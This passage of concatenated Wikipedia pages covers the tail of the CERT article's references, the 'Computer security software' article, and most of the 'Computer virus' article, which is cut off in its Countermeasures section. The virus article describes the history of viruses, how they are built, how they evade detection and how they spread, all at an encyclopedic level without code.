 
"CERT Tonga - Computer Emergency Response Team for TongaCERT Tonga | Computer Emergency Response Team for Tonga"
. 29 October 2018. Archived from 
the original
 on 29 October 2018
. Retrieved 
25 October
 2023
.




^
 
"Послуги кібербезпеки: замовити інформаційну безпеку"
. 
FSG
. Retrieved 
25 October
 2023
.




^
 
"CERT-UA"
. 
cert.gov.ua
. Retrieved 
25 October
 2023
.




^
 
http://www.aecert.ae
 
[
bare URL
]




^
 
"National Cert | Uganda National Computer Emergency Response Team-National Cert"
. 
www.cert.ug
. Retrieved 
25 October
 2023
.




^
 
https://www.ug-cert.ug
 
[
bare URL
]




^
 
Verton, Dan (28 January 2004). 
"DHS launches national cyber alert system"
. 
Computerworld
. IDG. Archived from 
the original
 on 31 August 2005
. Retrieved 
15 June
 2008
.




^
 
"Служба реагирования на компьютерные инциденты - UZCERT"
. 
uzcert.uz
. Retrieved 
25 October
 2023
.




^
 
"Trung tâm Ứng cứu khẩn cấp không gian mạng Việt Nam | Trung tâm VNCERT/CC"
. 
vncert.vn
. Retrieved 
25 October
 2023
.






External links
[
edit
]


CERT-CC website


FIRST website










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Computer_emergency_response_team&oldid=1241283086
"


Categories
: 
Carnegie Mellon University
Emergency services
Computer security organizations
Computer emergency response teams
Hidden categories: 
CS1 Hebrew-language sources (he)
All articles with bare URLs for citations
Articles with bare URLs for citations from August 2024
CS1 maint: archived copy as title
CS1 Thai-language sources (th)
Articles with short description
Short description is different from Wikidata
Articles needing additional references from December 2016
All articles needing additional references
Wikipedia introduction cleanup from July 2024
All pages needing cleanup
Articles covered by WikiProject Wikify from July 2024
All articles covered by WikiProject Wikify
Articles with multiple maintenance issues
Use dmy dates from January 2023
All articles with unsourced statements
Articles with unsourced statements from December 2023











From Wikipedia, the free encyclopedia






Computer program for information security


Computer security software
 or 
cybersecurity software
 is any 
computer program
 designed to influence 
information security
.  This is often taken in the context of defending computer systems or data, yet can incorporate programs designed specifically for subverting computer systems due to their significant overlap, and the adage that the best defense is a good offense.

The defense of 
computers
 against intrusion and unauthorized use of 
resources
 is called 
computer security
. Similarly, the defense of 
computer networks
 is called 
network security
.

The subversion of 
computers
 or their unauthorized use is referred to using the terms 
cyberwarfare
, 
cybercrime
, or 
security hacking
 (later shortened to 
hacking
 for further references in this article due to issues with 
hacker
, 
hacker culture
 and differences in 
white
/
grey
/
black
 'hat' color identification).

The computer security software products industry was launched in the second half of the 1970s when computer firms and new IT startups chose alternative paths to offer commercial access control systems to organizational mainframe computer users. These developments were led by 
IBM
's 
Resource Access Control Facility
 and SKK's Access Control Facility 2.
[
1
]






Types
[
edit
]


Below, various software implementations of Cybersecurity patterns and groups outlining ways a host system attempts to secure itself and its assets from malicious interactions, this includes tools to deter both 
passive
 and active 
security threats
. Although both security and usability are desired, today it is widely considered in computer security software that with higher security comes decreased usability, and with higher usability comes decreased security.
[
2
]




Prevent access
[
edit
]


The primary purpose of these types of systems is to restrict and often to completely prevent access to computers or data except to a very limited set of users. The theory is often that if a key, credential, or token is unavailable then access should be impossible. This often involves taking valuable information and then either reducing it to apparent noise or hiding it within another source of information in such a way that it is unrecoverable.



Cryptography
 and 
Encryption software


Steganography
 and 
Steganography tools


A critical tool used in developing software that prevents malicious access is 
Threat Modeling
.
[
3
]
 Threat modeling is the process of creating and applying mock situations where an attacker could be trying to maliciously access data in 
cyberspace
. By doing this, various profiles of potential attackers are created, including their intentions, and a catalog of potential vulnerabilities are created for the respective organization to fix before a real threat arises.
[
4
]
 Threat modeling covers a wide aspect of cyberspace, including devices, applications, systems, networks, or enterprises. Cyber threat modeling can inform organizations with their efforts pertaining to cybersecurity in the following ways:
[
5
]




Risk Management


Profiling of current cybersecurity applications


Considerations for future security implementations


Regulate access
[
edit
]


The purpose of these types of systems is usually to restrict access to computers or data while still allowing interaction.  Often this involves monitoring or checking credential, separating systems from access and view based on importance, and quarantining or isolating perceived dangers. A physical comparison is often made to a shield.  A form of protection whose use is heavily dependent on the system owners preferences and perceived threats.  Large numbers of users may be allowed relatively low-level access with limited security checks, yet significant opposition will then be applied toward users attempting to move toward critical areas.



Access control


Firewall


Sandbox


Monitor access
[
edit
]


The purpose of these types of software systems is to monitor access to computers systems and data while reporting or logging the behavior.  Often this is composed of large quantities of low priority data records / logs, coupled with high priority notices for unusual or suspicious behavior.



Diagnostic program


Intrusion detection system
 (IDS)


Intrusion prevention system
 (IPS)


Log management software


Records Management


Security information management


Security event management


Security information and event management
 (SIEM)


Surveillance monitor
[
edit
]


These programs use algorithms either stolen from, or provided by, the police and military internet observation organizations to provide the equivalent of a police 
Radio scanner
.  Most of these systems are born out of 
mass surveillance
 concepts for internet traffic, cell phone communication, and physical systems like 
CCTV
.  In a global perspective they are related to the fields of 
SIGINT
 and 
ELINT
 and approach 
GEOINT
 in the global information monitoring perspective.  Several instant messaging programs such as 
ICQ
 (founded by "former" members of Unit 8200), or 
WeChat
 and 
QQ
 (rumored 3PLA/4PLA connections
[
6
]
[
7
]
) may represent extensions of these observation apparati.



Block or remove malware
[
edit
]


The purpose of these types of software is to remove malicious or harmful forms of software that may compromise the security of a computer system.  These types of software are often closely linked with software for computer regulation and monitoring.  A physical comparison to a doctor, scrubbing, or cleaning ideas is often made, usually with an "anti-" style naming scheme related to a particular threat type.  Threats and unusual behavior are identified by a system such as a firewall or an intrusion detection system, and then the following types of software are used to remove them.  These types of software often require extensive research into their potential foes to achieve complete success, similar to the way that complete eradication of bacteria or viral threats does in the physical world.  Occasionally this also represents defeating an attackers encryption, such as in the case of data tracing, or hardened threat removal.



Anti-keyloggers


Anti-malware


Anti-spyware


Anti-subversion software


Anti-tamper software


Antivirus software


See also
[
edit
]


Computer security


Data security


Emergency management software


Cloud Workload Protection Platforms


Computer Antivirus Software


References
[
edit
]






^
 
Yost, Jeffrey R. (2015). 
"The Origin and Early History of the Computer Security Software Products Industry"
. 
IEEE Annals of the History of Computing
. 
37
 (2): 46–58. 
doi
:
10.1109/MAHC.2015.21
. Retrieved 
2023-12-13
.




^
 
Barragán, Claudio Casado (2017). 
Information Technology - New Generations
. Springer International Publishing. pp. 395–398. 
ISBN
 
9783319549774
.




^
 
Bodeau, Deborah J.; McCollum, Catherine D.; Fox, David B. (2018-04-07). 
"Cyber Threat Modeling: Survey, Assessment, and Representative Framework"
. 
Archived
 from the original on September 29, 2021.
 
{{
cite journal
}}
: 
Cite journal requires 
|journal=
 (
help
)




^
 
"Threat Modeling: 12 Available Methods"
. 
SEI Blog
. 2 December 2018
. Retrieved 
2021-10-04
.




^
 
Jones, Andy (2005). 
Risk management for computer security : Protecting your network and information assets
. Debi Ashenden. Amsterdam, Netherlands: Elsevier Butterworth-Heinemann. 
ISBN
 
978-0-08-049155-4
. 
OCLC
 
159937634
.




^
 
O'Neill, Patrick Howell (3 May 2017). 
"Under tough surveillance, China's cybercriminals find creative ways to chat"
. SNG. cyberscoop
. Retrieved 
22 October
 2020
.




^
 
Dasgupta, Binayak (1 July 2020). 
"Mass surveillance risk real with Chinese apps: Experts"
. Hindustan Times, New Delhi
. Retrieved 
22 October
 2020
.






v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Computer_security_software&oldid=1237936924
"


Category
: 
Computer security software
Hidden categories: 
CS1 errors: missing periodical
Articles with short description
Short description is different from Wikidata









Checked






From Wikipedia, the free encyclopedia




Page version status
This is an accepted version of this page
This is the 
latest accepted revision
, 
reviewed
 on 
17 September 2024
.


Computer program that modifies other programs to replicate itself and spread


Hex dump
 of the 
Brain
 virus, generally regarded as the first computer virus for the IBM Personal Computer (IBM PC) and compatibles


A 
computer virus
[
1
]
 is a type of 
malware
 that, when executed, replicates itself by modifying other 
computer programs
 and 
inserting
 its own 
code
 into those programs.
[
2
]
[
3
]
 If this replication succeeds, the affected areas are then said to be "infected" with a computer virus, a metaphor derived from biological 
viruses
.
[
4
]


Computer viruses generally require a 
host program
.
[
5
]
 The virus writes its own code into the host program. When the program runs, the written virus program is executed first, causing infection and damage. By contrast, a 
computer worm
 does not need a host program, as it is an independent program or code chunk. Therefore, it is not restricted by the 
host program
, but can run independently and actively carry out attacks.
[
6
]
[
7
]


Virus writers use 
social engineering
 
deceptions
 and exploit detailed knowledge of 
security vulnerabilities
 to initially infect systems and to spread the virus. Viruses use complex anti-detection/stealth strategies to evade 
antivirus software
.
[
8
]
 Motives for creating viruses can include seeking 
profit
 (e.g., with 
ransomware
), desire to send a political message, personal amusement, to demonstrate that a vulnerability exists in software, for 
sabotage
 and 
denial of service
, or simply because they wish to explore 
cybersecurity
 issues, 
artificial life
 and 
evolutionary algorithms
.
[
9
]


As of 2013, computer viruses caused billions of dollars' worth of economic damage each year.
[
10
]
 In response, an industry of 
antivirus software
 has cropped up, selling or freely distributing virus protection to users of various 
operating systems
.
[
11
]






History
[
edit
]


See also: 
History of antivirus software
, 
History of ransomware
, and 
History of malware


Further information: 
Timeline of computer viruses and worms
 and 
Malware research


The first academic work on the theory of self-replicating computer programs was done in 1949 by 
John von Neumann
 who gave lectures at the 
University of Illinois
 about the "Theory and Organization of Complicated 
Automata
". The work of von Neumann was later published as the "Theory of self-reproducing automata". In his essay von Neumann described how a computer program could be designed to reproduce itself.
[
12
]
 Von Neumann's design for a self-reproducing computer program is considered the world's first computer virus, and he is considered to be the theoretical "father" of computer virology.
[
13
]
 In 1972, Veith Risak directly building on von Neumann's work on 
self-replication
, published his article "Selbstreproduzierende Automaten mit minimaler Informationsübertragung" (Self-reproducing automata with minimal information exchange).
[
14
]
 The article describes a fully functional virus written in 
assembler
 programming language for a SIEMENS 4004/35 computer system. In 1980, Jürgen Kraus wrote his 
Diplom
 thesis "Selbstreproduktion bei Programmen" (Self-reproduction of programs) at the 
University of Dortmund
.
[
15
]
 In his work Kraus postulated that computer programs can behave in a way similar to biological viruses.



The 
MacMag
 virus 'Universal Peace', as displayed on a Mac in March 1988


The 
Creeper virus
 was first detected on 
ARPANET
, the forerunner of the 
Internet
, in the early 1970s.
[
16
]
 Creeper was an experimental self-replicating program written by Bob Thomas at 
BBN Technologies
 in 1971.
[
17
]
 Creeper used the ARPANET to infect 
DEC
 
PDP-10
 computers running the 
TENEX
 operating system.
[
18
]
 Creeper gained access via the ARPANET and copied itself to the remote system where the message, "I'M THE CREEPER. CATCH ME IF YOU CAN!" was displayed.
[
19
]
 The 
Reaper
 program was created to delete Creeper.
[
20
]


In 1982, a program called "
Elk Cloner
" was the first personal computer virus to appear "in the wild"—that is, outside the single computer or computer lab where it was created.
[
21
]
 Written in 1981 by 
Richard Skrenta
, a ninth grader at 
Mount Lebanon High School
 near 
Pittsburgh
, it attached itself to the 
Apple DOS
 3.3 operating system and spread via 
floppy disk
.
[
21
]
 On its 50th use the 
Elk Cloner
 virus would be activated, infecting the personal computer and displaying a short poem beginning "Elk Cloner: The program with a personality."

In 1984, 
Fred Cohen
 from the 
University of Southern California
 wrote his paper "Computer Viruses – Theory and Experiments".
[
22
]
 It was the first paper to explicitly call a self-reproducing program a "virus", a term introduced by Cohen's mentor 
Leonard Adleman
. In 1987, Fred Cohen published a demonstration that there is no 
algorithm
 that can perfectly detect all possible viruses.
[
23
]
 Fred Cohen's theoretical 
compression virus
[
24
]
 was an example of a virus which was not malicious software (
malware
), but was putatively benevolent (well-intentioned). However, 
antivirus
 professionals do not accept the concept of "benevolent viruses", as any desired function can be implemented without involving a virus (automatic compression, for instance, is available under 
Windows
 at the choice of the user). Any virus will by definition make unauthorised changes to a computer, which is undesirable even if no damage is done or intended. The first page of 
Dr Solomon's Virus Encyclopaedia
 explains the undesirability of viruses, even those that do nothing but reproduce.
[
25
]
[
26
]


An article that describes "useful virus functionalities" was published by 
J. B. Gunn
 under the title "Use of virus functions to provide a virtual 
APL
 interpreter under user control" in 1984.
[
27
]
 The first 
IBM PC compatible
 virus in the "wild" was a 
boot sector
 virus dubbed 
(c)Brain
,
[
28
]
 created in 1986 and was released in 1987 by Amjad Farooq Alvi and Basit Farooq Alvi in 
Lahore, Pakistan
, reportedly to deter unauthorized copying of the software they had written.
[
29
]
 The first virus to specifically target 
Microsoft Windows
, 
WinVir
 was discovered in April 1992, two years after the release of 
Windows 3.0
.
[
30
]
 The virus did not contain any 
Windows API
 
calls
, instead relying on 
DOS interrupts
. A few years later, in February 1996, Australian hackers from the virus-writing crew VLAD created the 
Bizatch
 virus (also known as "Boza" virus), which was the first known virus to target 
Windows 95
. In late 1997 the encrypted, memory-resident stealth virus 
Win32.Cabanas
 was released—the first known virus that targeted 
Windows NT
 (it was also able to infect Windows 3.0 and Windows 9x hosts).
[
31
]


Even 
home computers
 were affected by viruses. The first one to appear on the 
Amiga
 was a boot sector virus called 
SCA virus
, which was detected in November 1987.
[
32
]




Design
[
edit
]


Parts
[
edit
]


A computer virus generally contains three parts: the infection mechanism, which finds and infects new files, the payload, which is the malicious code to execute, and the trigger, which determines when to activate the payload.
[
33
]




Infection mechanism


Also called the infection vector, this is how the virus spreads. Some viruses have a 
search routine
, which locate and infect files on disk.
[
34
]
 Other viruses infect files as they are run, such as the 
Jerusalem DOS virus
.


Trigger


Also known as a 
logic bomb
, this is the part of the virus that determines the condition for which the 
payload
 is activated.
[
35
]
 This condition may be a particular date, time, presence of another program, size on 
disk
 exceeding a threshold,
[
36
]
 or opening a specific file.
[
37
]


Payload


The payload is the body of the virus that executes the malicious activity. Examples of malicious activities include damaging files, theft of confidential information or spying on the infected system.
[
38
]
[
39
]
 Payload activity is sometimes noticeable as it can cause the system to slow down or "freeze".
[
34
]
 Sometimes payloads are non-destructive and their main purpose is to spread a message to as many people as possible. This is called a 
virus hoax
.
[
40
]


Phases
[
edit
]


Virus phases is the 
life cycle
 of the computer virus, described by using an analogy to 
biology
. This life cycle can be divided into four phases:



Dormant phase


The virus program is idle during this stage. The virus program has managed to access the target user's computer or software, but during this stage, the virus does not take any action. The virus will eventually be activated by the "trigger" which states which event will execute the virus. Not all viruses have this stage.
[
34
]


Propagation phase


The virus starts propagating, which is multiplying and replicating itself. The virus places a copy of itself into other programs or into certain system areas on the disk. The copy may not be identical to the propagating version; viruses often "morph" or change to evade detection by IT professionals and anti-virus software. Each infected program will now contain a 
clone
 of the virus, which will itself enter a propagation phase.
[
34
]


Triggering phase


A dormant virus moves into this phase when it is activated, and will now perform the function for which it was intended. The triggering phase can be caused by a variety of system events, including a count of the number of times that this copy of the virus has made copies of itself.
[
34
]
 The trigger may occur when an employee is terminated from their employment or after a set period of time has elapsed, in order to reduce suspicion.


Execution phase


This is the actual work of the virus, where the "payload" will be released. It can be destructive such as deleting files on disk, crashing the system, or corrupting files or relatively harmless such as popping up humorous or political messages on screen.
[
34
]


Targets and replication
[
edit
]


Computer viruses infect a variety of different subsystems on their host computers and software.
[
41
]
 One manner of classifying viruses is to analyze whether they reside in 
binary executables
 (such as 
.EXE
 or 
.COM files
), data files (such as 
Microsoft Word
 documents or 
PDF files
), or in the 
boot sector
 of the host's 
hard drive
 (or some combination of all of these).
[
42
]
[
43
]


A 
memory-resident virus
 (or simply "resident virus") installs itself as part of the operating system when executed, after which it remains in 
RAM
 from the time the computer is booted up to when it is shut down. Resident viruses overwrite 
interrupt handling
 code or other 
functions
, and when the operating system attempts to access the target file or disk sector, the virus code intercepts the request and redirects the 
control flow
 to the replication module, infecting the target. In contrast, a 
non-memory-resident virus
 (or "non-resident virus"), when executed, scans the disk for targets, infects them, and then exits (i.e. it does not remain in memory after it is done executing).
[
44
]


Many common applications, such as 
Microsoft Outlook
 and 
Microsoft Word
, allow 
macro
 programs to be embedded in documents or emails, so that the programs may be run automatically when the document is opened. A 
macro virus
 (or "document virus") is a virus that is written in a 
macro language
 and embedded into these documents so that when users open the file, the virus code is executed, and can infect the user's computer. This is one of the reasons that it is dangerous to open unexpected or suspicious 
attachments
 in 
e-mails
.
[
45
]
[
46
]
 While not opening attachments in e-mails from unknown persons or organizations can help to reduce the likelihood of contracting a virus, in some cases, the virus is designed so that the e-mail appears to be from a reputable organization (e.g., a major bank or credit card company).

Boot sector viruses
 specifically target the 
boot sector
 and/or the 
Master Boot Record
[
47
]
 (MBR) of the host's 
hard disk drive
, 
solid-state drive
, or removable storage media (
flash drives
, 
floppy disks
, etc.).
[
48
]


The most common way of transmission of computer viruses in boot sector is physical media. When reading the VBR of the drive, the infected floppy disk or USB flash drive connected to the computer will transfer data, and then modify or replace the existing boot code. The next time a user tries to start the desktop, the virus will immediately load and run as part of the master boot record.
[
49
]


Email viruses are viruses that intentionally, rather than accidentally, use the email system to spread. While virus infected files may be accidentally sent as 
email attachments
, email viruses are aware of email system functions. They generally target a specific type of email system (
Microsoft Outlook
 is the most commonly used), harvest email addresses from various sources, and may append copies of themselves to all email sent, or may generate email messages containing copies of themselves as attachments.
[
50
]




Detection
[
edit
]


To avoid detection by users, some viruses employ different kinds of 
deception
. Some old viruses, especially on the 
DOS
 platform, make sure that the "last modified" date of a host file stays the same when the file is infected by the virus. This approach does not fool antivirus 
software
, however, especially those which maintain and date 
cyclic redundancy checks
 on file changes.
[
51
]
 Some viruses can infect files without increasing their sizes or damaging the files. They accomplish this by overwriting unused areas of executable files. These are called 
cavity viruses
. For example, the 
CIH virus
, or Chernobyl Virus, infects 
Portable Executable
 files. Because those files have many empty gaps, the virus, which was 1 
KB
 in length, did not add to the size of the file.
[
52
]
 Some viruses try to avoid detection by killing the tasks associated with antivirus software before it can detect them (for example, 
Conficker
). A Virus may also hide its presence using a 
rootkit
 by not showing itself on the list of system 
processes
 or by disguising itself within a trusted process.
[
53
]
 In the 2010s, as computers and operating systems grow larger and more complex, old hiding techniques need to be updated or replaced. Defending a computer against viruses may demand that a file system migrate towards detailed and explicit permission for every kind of file access.
[
citation needed
]
 In addition, only a small fraction of known viruses actually cause real incidents, primarily because many viruses remain below the theoretical epidemic threshold.
[
54
]




Read request intercepts
[
edit
]


While some kinds of antivirus software employ various techniques to counter stealth mechanisms, once the infection occurs any recourse to "clean" the system is unreliable. In Microsoft Windows operating systems, the 
NTFS file system
 is proprietary. This leaves antivirus software little alternative but to send a "read" request to Windows files that handle such requests. Some viruses trick antivirus software by intercepting its requests to the operating system. A virus can hide by intercepting the request to read the infected file, handling the request itself, and returning an uninfected version of the file to the antivirus software. The interception can occur by 
code injection
 of the actual operating system files that would handle the read request. Thus, an antivirus software attempting to detect the virus will either not be permitted to read the infected file, or, the "read" request will be served with the uninfected version of the same file.
[
55
]


The only reliable method to avoid "stealth" viruses is to boot from a medium that is known to be "clear". Security software can then be used to check the dormant operating system files. Most security software relies on virus signatures, or they employ 
heuristics
.
[
56
]
[
57
]
 Security software may also use a database of file "
hashes
" for Windows OS files, so the security software can identify altered files, and request Windows installation media to replace them with authentic versions. In older versions of Windows, file 
cryptographic hash functions
 of Windows OS files stored in Windows—to allow file integrity/authenticity to be checked—could be overwritten so that the 
System File Checker
 would report that altered system files are authentic, so using file hashes to scan for altered files would not always guarantee finding an infection.
[
58
]




Self-modification
[
edit
]


See also: 
Self-modifying code


Most modern antivirus programs try to find virus-patterns inside ordinary programs by scanning them for so-called 
virus signatures
.
[
59
]
 Different antivirus programs will employ different search methods when identifying viruses. If a virus scanner finds such a pattern in a file, it will perform other checks to make sure that it has found the virus, and not merely a coincidental sequence in an innocent file, before it notifies the user that the file is infected. The user can then delete, or (in some cases) "clean" or "heal" the infected file. Some viruses employ techniques that make detection by means of signatures difficult but probably not impossible. These viruses modify their code on each infection. That is, each infected file contains a different variant of the virus.
[
citation needed
]


One method of evading signature detection is to use simple 
encryption
 to encipher (encode) the body of the virus, leaving only the encryption module and a static 
cryptographic key
 in 
cleartext
 which does not change from one infection to the next.
[
60
]
 In this case, the virus consists of a small decrypting module and an encrypted copy of the virus code. If the virus is encrypted with a different key for each infected file, the only part of the virus that remains constant is the decrypting module, which would (for example) be appended to the end. In this case, a virus scanner cannot directly detect the virus using signatures, but it can still detect the decrypting module, which still makes indirect detection of the virus possible. Since these would be symmetric keys, stored on the infected host, it is entirely possible to decrypt the final virus, but this is probably not required, since 
self-modifying code
 is such a rarity that finding some may be reason enough for virus scanners to at least "flag" the file as suspicious.
[
citation needed
]
 An old but compact way will be the use of arithmetic operation like addition or subtraction and the use of logical conditions such as 
XORing
,
[
61
]
 where each byte in a virus is with a constant so that the exclusive-or operation had only to be repeated for decryption. It is suspicious for a code to modify itself, so the code to do the encryption/decryption may be part of the signature in many virus definitions.
[
citation needed
]
 A simpler older approach did not use a key, where the encryption consisted only of operations with no parameters, like incrementing and decrementing, bitwise rotation, arithmetic negation, and logical NOT.
[
61
]
 Some viruses, called polymorphic viruses, will employ a means of encryption inside an executable in which the virus is encrypted under certain events, such as the virus scanner being disabled for updates or the computer being 
rebooted
.
[
62
]
 This is called 
cryptovirology
.

Polymorphic code
 was the first technique that posed a serious 
threat
 to virus scanners. Just like regular encrypted viruses, a polymorphic virus infects files with an encrypted copy of itself, which is decoded by a 
decryption
 module. In the case of polymorphic viruses, however, this decryption module is also modified on each infection. A well-written polymorphic virus therefore has no parts which remain identical between infections, making it very difficult to detect directly using "signatures".
[
63
]
[
64
]
 Antivirus software can detect it by decrypting the viruses using an 
emulator
, or by 
statistical pattern analysis
 of the encrypted virus body. To enable polymorphic code, the virus has to have a 
polymorphic engine
 (also called "mutating engine" or "
mutation
 engine") somewhere in its encrypted body. See 
polymorphic code
 for technical detail on how such engines operate.
[
65
]


Some viruses employ polymorphic code in a way that constrains the mutation rate of the virus significantly. For example, a virus can be programmed to mutate only slightly over time, or it can be programmed to refrain from mutating when it infects a file on a computer that already contains copies of the virus. The advantage of using such slow polymorphic code is that it makes it more difficult for antivirus professionals and investigators to obtain representative samples of the virus, because "bait" files that are infected in one run will typically contain identical or similar samples of the virus. This will make it more likely that the detection by the virus scanner will be unreliable, and that some instances of the virus may be able to avoid detection.

To avoid being detected by emulation, some viruses rewrite themselves completely each time they are to infect new executables. Viruses that utilize this technique are said to be in 
metamorphic code
. To enable metamorphism, a "metamorphic engine" is needed. A metamorphic virus is usually very large and complex. For example, 
W32/Simile
 consisted of over 14,000 lines of 
assembly language
 code, 90% of which is part of the metamorphic engine.
[
66
]
[
67
]




Effects
[
edit
]


Damage is due to causing system failure, corrupting data, wasting computer resources, increasing maintenance costs or stealing personal information.
[
10
]
 Even though no antivirus software can uncover all computer viruses (especially new ones), computer security researchers are actively searching for new ways to enable antivirus solutions to more effectively detect emerging viruses, before they become widely distributed.
[
68
]


A 
power virus
 is a computer program that executes specific machine code to reach the maximum 
CPU power dissipation
 (
thermal energy
 output for the 
central processing units
).
[
69
]
 Computer cooling apparatus are designed to dissipate power up to the 
thermal design power
, rather than maximum power, and a power virus could cause the system to overheat if it does not have logic to stop the processor. This may cause permanent physical damage. Power viruses can be malicious, but are often suites of test software used for 
integration testing
 and thermal testing of computer components during the design phase of a product, or for product 
benchmarking
.
[
70
]


Stability test
 applications are similar programs which have the same effect as power viruses (high CPU usage) but stay under the user's control.  They are used for testing CPUs, for example, when 
overclocking
. 
Spinlock
 in a poorly written program may cause similar symptoms, if it lasts sufficiently long.

Different micro-architectures typically require different machine code to hit their maximum power.  Examples of such machine code do not appear to be distributed in CPU reference materials.
[
71
]




Infection vectors
[
edit
]


As software is often designed with security features to prevent unauthorized use of system resources, many viruses must exploit and manipulate 
security bugs
, which are 
security defects
 in a system or application software, to spread themselves and infect other computers. 
Software development
 strategies that produce large numbers of "bugs" will generally also produce potential 
exploitable
 "holes" or "entrances" for the virus.

To replicate itself, a virus must be permitted to execute code and write to memory. For this reason, many viruses attach themselves to 
executable files
 that may be part of legitimate programs (see 
code injection
). If a user attempts to launch an infected program, the virus' code may be executed simultaneously.
[
72
]
 In operating systems that use 
file extensions
 to determine program associations (such as Microsoft Windows), the extensions may be hidden from the user by default. This makes it possible to create a file that is of a different type than it appears to the user. For example, an executable may be created and named "picture.png.exe", in which the user sees only "picture.png" and therefore assumes that this file is a 
digital image
 and most likely is safe, yet when opened, it runs the executable on the client machine.
[
73
]
 Viruses may be installed on removable media, such as 
flash drives
. The drives may be left in a parking lot of a government building or other target, with the hopes that curious users will insert the drive into a computer. In a 2015 experiment, researchers at the University of Michigan found that 45–98 percent of users would plug in a flash drive of unknown origin.
[
74
]


The vast majority of viruses target systems running 
Microsoft Windows
. This is due to Microsoft's large market share of 
desktop computer
 users.
[
75
]
 The diversity of software systems on a network limits the destructive potential of viruses and malware.
[
a
]
 
Open-source
 operating systems such as 
Linux
 allow users to choose from a variety of 
desktop environments
, packaging tools, etc., which means that malicious code targeting any of these systems will only affect a subset of all users. Many Windows users are running the same set of applications, enabling viruses to rapidly spread among Microsoft Windows systems by targeting the same exploits on large numbers of hosts.
[
76
]
[
77
]
[
78
]
[
79
]


While Linux and Unix in general have always natively prevented normal users from making changes to the 
operating system
 environment without permission, Windows users are generally not prevented from making these changes, meaning that viruses can easily gain control of the entire system on Windows hosts. This difference has continued partly due to the widespread use of 
administrator
 accounts in contemporary versions like 
Windows XP
. In 1997, researchers created and released a virus for Linux—known as "
Bliss
".
[
80
]
 Bliss, however, requires that the user run it explicitly, and it can only infect programs that the user has the access to modify. Unlike Windows users, most Unix users do not 
log in
 as an administrator, or 
"root user"
, except to install or configure software; as a result, even if a user ran the virus, it could not harm their operating system. The Bliss virus never became widespread, and remains chiefly a research curiosity. Its creator later posted the source code to 
Usenet
, allowing researchers to see how it worked.
[
81
]


Before computer networks became widespread, most viruses spread on 
removable media
, particularly 
floppy disks
. In the early days of the 
personal computer
, many users regularly exchanged information and programs on floppies. Some viruses spread by infecting programs stored on these disks, while others installed themselves into the disk 
boot sector
, ensuring that they would be run when the user booted the computer from the disk, usually inadvertently. Personal computers of the era would attempt to boot first from a floppy if one had been left in the drive. Until floppy disks fell out of use, this was the most successful infection strategy and boot sector viruses were the most common in the "wild" for many years. Traditional computer viruses emerged in the 1980s, driven by the spread of personal computers and the resultant increase in 
bulletin board system
 (BBS), 
modem
 use, and software sharing. 
Bulletin board
–driven software sharing contributed directly to the spread of 
Trojan horse
 programs, and viruses were written to infect popularly traded software. 
Shareware
 and 
bootleg
 software were equally common 
vectors
 for viruses on BBSs.
[
82
]
[
83
]
 Viruses can increase their chances of spreading to other computers by infecting files on a 
network file system
 or a file system that is accessed by other computers.
[
84
]


Macro viruses
 have become common since the mid-1990s. Most of these viruses are written in the scripting languages for Microsoft programs such as 
Microsoft Word
 and 
Microsoft Excel
 and spread throughout 
Microsoft Office
 by infecting documents and 
spreadsheets
. Since Word and Excel were also available for 
Mac OS
, most could also spread to 
Macintosh computers
. Although most of these viruses did not have the ability to send infected 
email messages
, those viruses which did take advantage of the 
Microsoft Outlook
 
Component Object Model
 (COM) interface.
[
85
]
[
86
]
 Some old versions of Microsoft Word allow macros to replicate themselves with additional blank lines. If two macro viruses simultaneously infect a document, the combination of the two, if also self-replicating, can appear as a "mating" of the two and would likely be detected as a virus unique from the "parents".
[
87
]


A virus may also send a 
web address link
 as an 
instant message
 to all the contacts (e.g., friends and colleagues' e-mail addresses) stored on an infected machine. If the recipient, thinking the link is from a friend (a trusted source) follows the link to the website, the virus hosted at the site may be able to infect this new computer and continue propagating.
[
88
]
 Viruses that spread using 
cross-site scripting
 were first reported in 2002,
[
89
]
 and were academically demonstrated in 2005.
[
90
]
 There have been multiple instances of the cross-site scripting viruses in the "wild", exploiting websites such as 
MySpace
 (with the Samy worm) and 
Yahoo!
.



Countermeasures
[
edit
]


See also: 
Malware § Vulnerability to malware
, 
Anti-malware
, and 
Browser security § Browser hardening


Screenshot of the 
open-source
 
ClamWin
 
antivirus software
 running in 
Wine
 on 
Ubuntu Linux


In 1989 The 
ADAPSO
 Software Industry Division
 published 
Dealing With Electronic Vandalism
,
[
91
]
 in which they followed the risk of data loss by "the added risk of losing customer confidence."
[
92
]
[
93
]
[
94
]


Many users install 
antivirus software
 that can detect and eliminate known viruses when the computer attempts to 
download
 or run the executable file (which may be distributed as an email attachment, or on 
USB flash drives
, for example). Some antivirus software blocks known malicious websites that attempt to install malware. Antivirus software does not change the underlying capability of hosts to transmit viruses. Users must update their software regularly to 
patch
 
security vulnerabilities
 ("holes"). Antivirus software also needs to be regularly updated to recognize the latest 
threats
. This is because malicious 
hackers
 and other individuals are always creating new viruses. The German 
AV-TEST
 Institute publishes evaluations of antivirus software for Windows
[
95
]
 and Android.
[
96
]


Examples of Microsoft Windows 
anti virus
 and anti-malware software include the optional 
